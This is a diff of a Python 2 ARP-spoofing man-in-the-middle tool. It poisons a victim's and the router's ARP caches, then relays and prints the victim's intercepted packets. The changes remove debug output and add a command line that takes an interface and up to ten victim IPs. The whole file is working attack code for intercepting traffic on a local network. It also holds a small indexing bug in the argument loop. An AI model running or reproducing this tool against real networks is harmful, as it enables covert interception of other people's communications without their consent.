@@ -107,7 +107,6 @@ class ARP:
             s.close()
 
             if response['arp']['hwdst']==self.sender_mac and response['arp']['pdst']==self.sender_ip :
-            # if response is not None:
                 return response
             
             retry -= 1
@@ -140,13 +139,12 @@ class Sniff(ARP):
         self.victim_mac = getMacByIP( arp.iface, self.victim_ip )
         self.router_ip  = getGWIP()
         self.router_mac = getMacByIP( arp.iface, getGWIP() )
-        # print '"%s" "%s"' %( arp.iface, self.victim_ip )
-        print 'victim %s %s, router %s %s' % (self.victim_ip, self.victim_mac, self.router_ip, self.router_mac)
-        print getGWIP()
+        # print 'victim %s %s, router %s %s' % (self.victim_ip, self.victim_mac, self.router_ip, self.router_mac)
+        # print getGWIP()
 
     def run(self):
         poison_thread = threading.Thread( target=self.poison, args=() )
-        relay_thread  = threading.Thread( target=self.relay, args=() )
+        relay_thread  = threading.Thread( target=self.relay,  args=() )
         
         poison_thread.start()
         relay_thread.start()
@@ -171,21 +169,7 @@ class Sniff(ARP):
         restored_packet  = mac2str( self.router_mac )
         restored_packet += mac2str( self.attacker_mac )
         restored_packet += packet[12:]
-        #
-        # restored_packet  = packet
-        #
         return restored_packet
-
-
-    # def restorePacketHeader(self, packet):
-    #     gateway_mac = "\x90\x9f\x33\x9a\x47\x34"
-    #     arp_partition = unpack("2s2s1s1s2s6s4s6s4s", packet[14:42])
-    #     print arp_partition
-    #     edited_arp_partition = arp_partition[:6] + (gateway_mac,) + arp_partition[7:]
-    #     print edited_arp_partition
-        
-    #     packed_edited_arp_partition = pack("2s2s1s1s2s6s4s6s4s", *edited_arp_partition)
-    #     return packet[:13] + packed_edited_arp_partition + packet[42:]
 
     def relay(self):
         recv_s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_IP ) )
@@ -198,9 +182,8 @@ class Sniff(ARP):
 
                 if header['ether']['dst'] == getMyMac( arp.iface ) and header['ether']['src']==self.victim_mac:
                 # if header['ether']['dst'] == getMyMac( arp.iface ) and header['ether']['src']==self.victim_mac or header['ether']['src']=='68-EC-C5-0B-EC-8F':
-                    print '\n\nPACKET SEND\n\n'
+                    print '\nPACKET RELAYED'
                     packet = self.restorePacketHeader( packet )  
-                    print 'restored packet : ', `packet`       
                     send_s.send( packet )
             
             except Exception, e:
@@ -208,31 +191,27 @@ class Sniff(ARP):
                 pass
             
             print '--------------------------------------------'
-            print "dst", header['ether']['dst']
-            print 'src', header['ether']['src']
+            print "dst", header['ether']['dst'],
+            print '-> src', header['ether']['src']
+            print 'type 0x%x' % header['ether']['type']
+            # print 'packet', `packet`[:50]
+            print 'protocol type', u8( packet[23] )
 
-            
-            print 'type 0x%x' % header['ether']['type'] #& 0xffff
-            print 'packet', `packet`[:50]
-            print 'protocol', u8( packet[23] )
-            print '--------------------------------------------'
 
 if __name__ == '__main__':
-    # arp = ARP("ens33")
-    arp = ARP( 'wlx88366cf0ce58' )
-    # # sniff = Sniff( arp, '192.168.248.130' )
-    sniff = Sniff( arp, '10.1.1.8' )
-    sniff.run()
-    # sniff.poison()
-        
-    #192.168.43.192
-'''
-victim 10.1.1.8 00:00:00:00:00:00, router 10.1.1.1 90:9f:33:9a:47:34
+    if len( sys.argv ) < 3:
+        print "Usage: python %s <INTERFACE> <VICTIM IP> [<VICTIM IP2>, ..." % sys.argv[0]
+        exit(0)
+    elif len( sys.argv ) > 12:
+        print "CANNOT MAKE OVER 10 SESSIONS"
 
-route
+    try:    
+        arp = ARP( sys.argv[1] )
+        for i in xrange( 2, len( sys.argv )+1 ):
+            print 'make victim sniffing session : %s' % sys.argv[i]
+            sniff = Sniff( arp, sys.argv[i] )
+            sniff.run()
 
-192.168.248.1            ether   00:50:56:c0:00:08   C                     ens33
-192.168.248.2            ether   00:50:56:e2:ad:1c   C                     ens33
-192.168.248.254          ether   00:50:56:f3:89:f6   C                     ens33
-192.168.248.130          ether   00:0c:29:4c:ae:cf   C                     ens33
-'''
+    except Exception, e:
+        sys.exit( e )
+
